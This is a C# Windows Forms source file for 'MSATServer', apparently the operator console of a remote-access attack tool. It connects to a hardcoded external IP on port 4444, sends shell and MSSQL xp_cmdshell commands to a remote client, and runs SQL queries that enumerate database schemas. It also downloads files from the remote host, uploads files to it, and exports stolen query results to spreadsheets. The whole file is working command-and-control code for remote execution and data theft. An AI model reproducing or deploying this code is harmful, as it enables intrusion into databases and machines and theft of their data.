using DevExpress.Spreadsheet;
using Spire.Xls;
using System;
using System.Data;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace MSATServer
{
    public partial class MSATServer : DevExpress.XtraEditors.XtraForm
    {

        //Boolean loadingflag = true;
        String sqlcommnd = "";
        String serverHOST = "185.207.154.241";
        int serverPORT = 4444;
        Listening listening = new Listening();
        Loading loading = new Loading();
        Socket tcpClient = null;

        public MSATServer()
        {

            listening.Show();
            listening.SetLoading(loading);
            new Thread(() =>
            {
                Boolean a = false;
                while (!a)
                {
                    a = listening.Getflag();
                }
                Console.WriteLine("Listen...");
                //serverHOST = listening.GetHost();
                serverPORT = listening.GetPort();
                Console.WriteLine(serverHOST + ":" + serverPORT);
                IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse(serverHOST), serverPORT);
                Socket tcpServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                /**tcpServer.Bind(serverIP);
                tcpServer.Listen(1000);
                tcpClient = tcpServer.Accept();**/
                tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                tcpClient.Connect(serverIP);

                Console.WriteLine("连接成功！\r\n");
                MSATSocket.TcpServer(tcpClient,this);
                this.Invoke((MethodInvoker)delegate
                {
                    sqlCommand.Text = "客户端连接成功！请连接数据库！";
                    loading.Close();
                });

            }).Start();
            InitializeComponent();
        }


        Sign login = Sign.GetSingleMode();

        private void MSATServer_Load(object sender, EventArgs e)
        {
            //ribbonControl1.Minimized = true;
        }

        private void MSATServer_FormClosing(object sender, FormClosingEventArgs e)
        {
            Console.WriteLine("正在关闭程序!");
            MessageBoxButtons messButton = MessageBoxButtons.YesNoCancel;
            DialogResult result = MessageBox.Show("确定要退出服务端并关闭服务端吗?", "退出" ,messButton);
            if (result == DialogResult.Yes)
            {
                Console.WriteLine("全部退出");
                using (StreamWriter sw = new StreamWriter("xp_cmdshellOutPut.txt"))
                {
                    sw.WriteLine(xp_cmdshellOutPutTextBox.Text);
                    sw.Close();
                }
                using (StreamWriter sw = new StreamWriter("CmdOutPut.txt"))
                {
                    sw.WriteLine(cmdOutPutTextBox.Text);
                    sw.Close();
                }
                MSATSocket.SendMess(tcpClient, "Exit", "e");
                System.Environment.Exit(System.Environment.ExitCode);
            }
            else if (result == DialogResult.No)
            {
                Console.WriteLine("仅退出");
                using (StreamWriter sw = new StreamWriter("xp_cmdshellOutPut.txt"))
                {
                    sw.WriteLine(xp_cmdshellOutPutTextBox.Text);
                    sw.Close();
                }
                using (StreamWriter sw = new StreamWriter("CmdOutPut.txt"))
                {
                    sw.WriteLine(cmdOutPutTextBox.Text);
                    sw.Close();
                }
                System.Environment.Exit(System.Environment.ExitCode);
            }
            else
            {
                Console.WriteLine("取消退出");
                e.Cancel = true;
            }
        }

        private void sign_Click(object sender, EventArgs e)
        {
            login.settcpClient(tcpClient);
            login.Show();
        }

        private void refresh_Click(object sender, EventArgs e)
        {
            Console.WriteLine("" + login.GetsqlIP() + login.GetsqlUserName() + login.GetsqlPWD() + login.GetsqlName());
        }

        private void cmdButton_Click(object sender, EventArgs e)
        {
            try
            {
                String mess;
                mess = cmdInPutTextBox.Text.ToString();   //chcp 65001  切换cmd到utf-8编码    936对应GB2312   950对应BIG5   1201对应unicode
                if (mess == null)
                {
                    mess = " ";
                }
                MSATSocket.SendMess(tcpClient, mess, "4");
            }
            catch (Exception ex)
            {
                Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                DialogResult result;

                Console.WriteLine("Socket连接断开，正在关闭程序!");
                result = MessageBox.Show("Socket连接断开！" + ex.Message + "请退出程序后重新连接！\r\n确定退出吗？", "退出", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
                if (result == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter("xp_cmdshellOutPut.txt"))
                    {
                        sw.WriteLine(xp_cmdshellOutPutTextBox.Text);
                    }
                    using (StreamWriter sw = new StreamWriter("CmdOutPut.txt"))
                    {
                        sw.WriteLine(cmdOutPutTextBox.Text);
                    }
                    System.Environment.Exit(System.Environment.ExitCode);
                }
            }
        }

        private void cmdOutPutTextBox_TextChanged(object sender, EventArgs e)
        {
            cmdOutPutTextBox.SelectionStart = cmdOutPutTextBox.Text.Length; //设置文本起点位置
            cmdOutPutTextBox.ScrollToCaret(); //滚动到当前插入位置
        }

        private void xp_cmdshellButton_Click(object sender, EventArgs e)
        {
            String xp_cmdshellInPut = xp_cmdshellInPutTextBox.Text.ToString();
            MSATSocket.SendMess(tcpClient, xp_cmdshellInPut, "3");
        }

        private void sqlSearch_Click(object sender, EventArgs e)
        {
            sqlcommnd = sqlCommand.Text.ToString();
            MSATSocket.SendMess(tcpClient, sqlcommnd, "2");
            this.Invoke((MethodInvoker)delegate
            {
                sqlCommand.Text = sqlcommnd + "\r\n 正在查询中，请勿重复点击查询！";
            });
        }

        private void xp_cmdshellOutPutTextBox_TextChanged(object sender, EventArgs e)
        {
            xp_cmdshellOutPutTextBox.SelectionStart = xp_cmdshellOutPutTextBox.Text.Length; //设置文本起点位置
            xp_cmdshellOutPutTextBox.ScrollToCaret(); //滚动到当前插入位置
        }

        private void saveButton_Click(object sender, EventArgs e)
        {
            try
            {
                String command = sqlCommand.Text;
                string pattern = @"\b[fF]\S*\b *\S*";
                MatchCollection mc = Regex.Matches(command, pattern);
                foreach (Match m in mc)
                {
                    pattern = @"\b[fF]\S*\b *";
                    Regex rgx = new Regex(pattern);
                    command = rgx.Replace(m.Value, "");
                    break;
                }
                command = login.GetsqlIP() + "-" + command + ".xlsx";
                Workbook workbook = new Workbook();
                workbook.LoadFromFile(".tmp.xlsx");
                workbook.SaveToFile(command, ExcelVersion.Version2013);
                MessageBox.Show("导出路径：" + System.Windows.Forms.Application.StartupPath + "\\" + command, "导出成功");
            }
            catch (Exception ex)
            {
                MessageBox.Show("失败原因：" + ex.Message, "导出失败");
            }

        }

        private void DownloadButton_Click(object sender, EventArgs e)
        {
            String clientFilePath = ClientFilePathTextEdit.Text;
            MSATSocket.SendMess(tcpClient,clientFilePath,"5");
        }

        private void UploadButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog GetData = new OpenFileDialog();     //以打开的方式
            GetData.Multiselect = false;                       //该值确定是否可以选择多个文件
            GetData.Title = "请选择文件";                       //标题
            GetData.InitialDirectory = @"C:\";                 //默认打开C:\路径（可更改）
            //限制只显示文件夹及后缀为sql的文件（可根据需求更改）
            GetData.Filter = "任意文件(*.*)|*.*";
            string serverFilePath = "";
            while (true)
            {
                if (GetData.ShowDialog() == DialogResult.OK)
                {     //如果选择了文件
                    serverFilePath = GetData.FileName;                    //script赋值为所选文件的路径
                    String filePath = serverFilePath;
                    FileStream fsRead = new FileStream(filePath, FileMode.Open);
                    long fileLength = fsRead.Length;
                    MSATSocket.SendMess(tcpClient, Path.GetFileName(filePath) + "," + fileLength.ToString(), "6");
                    byte[] Filebuffer = new byte[1024 * 1024 * 3];//定义3MB的缓存空间（1024字节(b)=1千字节(kb)）
                    int readLength = 1024 * 1024 * 3;  //定义读取的长度
                                                       //bool firstRead = true;//定义首次读取的状态
                    long sentFileLength = 0;//定义已发送的长度

                    while (readLength > 0 && sentFileLength < fileLength)
                    {
                        if ((fileLength - sentFileLength) < 1024 * 1024 * 3)
                        {
                            readLength = (int)(fileLength - sentFileLength);
                        }
                        sentFileLength += readLength;//计算已读取文件大小
                                                     //第一次发送的字节流上加个前缀1
                        fsRead.Read(Filebuffer, 0, readLength);
                        tcpClient.Send(Filebuffer, 0, readLength, SocketFlags.None);//继续发送剩下的数据包
                        Console.WriteLine("{0}: 已发送数据：{1}/{2}", tcpClient.RemoteEndPoint, sentFileLength, fileLength);//查看发送进度
                    }
                    fsRead.Close();//关闭文件流
                    break;
                }
                else
                    break;
            }
            Console.WriteLine("选择了文件：" + serverFilePath);
        }

        public void RefreshUI(char firstFlag,String mess)
        {
            StringReader stream = null;
            XmlTextReader reader = null;
            DataSet ds = new DataSet();
            if (firstFlag == '1')
            {
                this.Invoke((MethodInvoker)delegate
                {
                    textBox1.Text = "IP：" + login.GetsqlIP() + "\r\n" + "User：" + login.GetsqlUserName();
                    sqlCommand.Text = "数据库连接成功！正在获取数据库结构信息...";
                    xp_cmdshellOutPutTextBox.Text = "数据库已连接！";

                });
                if (mess[0] == '2')   //返回的数据库权限信息
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        textBox2.Text = mess.Substring(1);
                    });
                }
                else if (mess[0] == '3')   //数据库返回的系统基本信息
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        textBox3.Text = mess.Substring(1);
                    });
                }
                else if (mess[0] == '4')   //获取的数据库表字段信息
                {
                    if (mess.Length > 1 && mess[1] != '数')
                    {
                        try
                        {
                            mess = mess.Substring(1);
                            stream = new StringReader(mess);
                            reader = new XmlTextReader(stream); ;
                            ds.ReadXml(reader);
                            this.Invoke((MethodInvoker)delegate
                            {
                                sqlTreeView.Nodes.Clear();
                                sqlCommand.Text = "数据库结构信息获取成功！";
                            });
                            foreach (DataTable dataTable in ds.Tables)
                            {
                                TreeNode fatherTN = new TreeNode(dataTable.Rows[0]["database_name"].ToString());
                                fatherTN = SetTreeNode(fatherTN, dataTable);
                                //Console.WriteLine("当前数据库为："+dataTable.Rows[0]["database_name"].ToString());
                                this.Invoke((MethodInvoker)delegate
                                {
                                    sqlTreeView.Nodes.Add(fatherTN);
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message + "\n接收到的数据库表信息：" + mess);
                        }
                    }
                    else
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            TreeNode failTN = new TreeNode("数据库结构获取失败！");
                            sqlTreeView.Nodes.Add(failTN);
                            sqlCommand.Text = "数据库结构获取失败！";
                        });
                    }
                }
            }
            else if (firstFlag == '2')
            {
                //String[] resuletable = Regex.Split(mess, "_;,_", RegexOptions.IgnoreCase);
                try
                {
                    //Console.WriteLine(mess);
                    using (StreamWriter sw = new StreamWriter(".tmp.csv", false, Encoding.UTF8))
                    {
                        sw.WriteLine(mess);
                    }
                }
                catch (Exception e)
                {
                    // 向用户显示出错消息
                    Console.WriteLine("The file could not be Writer:");
                    Console.WriteLine(e.Message);
                }

                Workbook workbook = new Workbook();
                workbook.LoadFromFile(".tmp.csv", "_;&,", 1, 1);
                workbook.SaveToFile(".tmp.xlsx", ExcelVersion.Version2013);
                DevExpress.Spreadsheet.Worksheet spreadsheet = spreadsheetControl1.ActiveWorksheet.Workbook.Worksheets[0];
                this.Invoke((MethodInvoker)delegate
                {
                    //worksheet.Import(datatable, true, 0, 0);
                    //worksheet.Workbook.LoadDocument("tmp.xlsx", DocumentFormat.OpenXml);
                    //var da = worksheet.GetDataRange();//获得有数据的区域
                    //worksheet.Columns.AutoFit(0, da.ColumnCount);//从0列到有数据的列自动列宽

                    spreadsheet.Workbook.LoadDocument(".tmp.xlsx", DocumentFormat.OpenXml);
                    /**var da = spreadsheetControl1.ActiveWorksheet.GetUsedRange();//获得有数据的区域     //结果长度自适应，大量数据会造成卡顿
                    spreadsheetControl1.ActiveWorksheet.Columns.AutoFit(0, da.ColumnCount);
                    spreadsheetControl1.ActiveWorksheet.FreezeRows(0, da);
                    //spreadsheet.Columns.AutoFit(0, da.ColumnCount);
                    spreadsheet.FreezeRows(0, da);**/
                    sqlCommand.Text = sqlcommnd;
                });

            }
            else if (firstFlag == '3')
            {
                String xp_cmdshellresult = "";
                stream = new StringReader(mess);
                reader = new XmlTextReader(stream); ;
                ds.ReadXml(reader);
                foreach (DataRow mDr in ds.Tables[0].Rows)
                {
                    foreach (DataColumn mDc in ds.Tables[0].Columns)
                    {
                        xp_cmdshellresult = xp_cmdshellresult + mDr[mDc].ToString() + "\r\n";
                    }
                }
                Console.WriteLine(xp_cmdshellresult);
                this.Invoke((MethodInvoker)delegate
                {
                    xp_cmdshellOutPutTextBox.Text = xp_cmdshellOutPutTextBox.Text + "\r\n" + xp_cmdshellInPutTextBox.Text + "\r\n" + xp_cmdshellresult;
                });
            }
            else if (firstFlag == '4')
            {
                int len = mess.Length;
                if (len > 0)
                {
                    if (mess[0] == '\n' && len >= 2)
                    {
                        mess = mess.Substring(1, len - 1);
                        if (mess.EndsWith("\n"))
                        {
                            mess = mess.Substring(0, mess.Length - 1);
                        }
                    }
                }
                mess = mess.Replace("\n", "\r\n");
                this.Invoke((MethodInvoker)delegate
                {
                    this.cmdOutPutTextBox.Text += mess;
                });

            }
            else if (firstFlag == '5')
            {
                this.Invoke((MethodInvoker)delegate
                {
                    cmdOutPutTextBox.Text += mess;
                });
            }
            else if (firstFlag == '6')
            {
                this.Invoke((MethodInvoker)delegate
                {
                    cmdOutPutTextBox.Text += mess;
                });
            }
            else if (firstFlag == 'a')
            {
                this.Invoke((MethodInvoker)delegate
                {
                    sqlCommand.Text = mess;
                });
            }
            else if (firstFlag == 'b')
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (xp_cmdshellOutPutTextBox.Text == "数据库未连接，请连接后再试！" || xp_cmdshellOutPutTextBox.Text == "请连接数据库！")
                        xp_cmdshellOutPutTextBox.Text = mess;
                    else
                        xp_cmdshellOutPutTextBox.Text += mess;
                });
            }
            stream = null;
            reader = null;
            ds = null;
            GC.Collect();
        }

        public TreeNode SetTreeNode(TreeNode fatherTN, DataTable dataTable)
        {
            String tableName = dataTable.Rows[0]["table_name"].ToString();
            TreeNode tableTN = new TreeNode(tableName);
            fatherTN.Nodes.Add(tableTN);
            TreeNode columnTN;
            foreach (DataRow row in dataTable.Rows)
            {
                if (tableName == row[1].ToString())   //判断表名是否已经在节点中了
                {
                    columnTN = new TreeNode(row[2].ToString());
                    tableTN.Nodes.Add(columnTN);
                }
                else
                {
                    tableName = row[1].ToString();
                    tableTN = new TreeNode(tableName);
                    fatherTN.Nodes.Add(tableTN);
                    columnTN = new TreeNode(row[2].ToString());
                    tableTN.Nodes.Add(columnTN);
                }

            }
            return fatherTN;
        }

        public void SaveData()
        {
            using (StreamWriter sw = new StreamWriter("xp_cmdshellOutPut.txt"))
            {
                sw.WriteLine(xp_cmdshellOutPutTextBox.Text);
            }
            using (StreamWriter sw = new StreamWriter("CmdOutPut.txt"))
            {
                sw.WriteLine(cmdOutPutTextBox.Text);
            }
            System.Environment.Exit(System.Environment.ExitCode);
        }

    }
}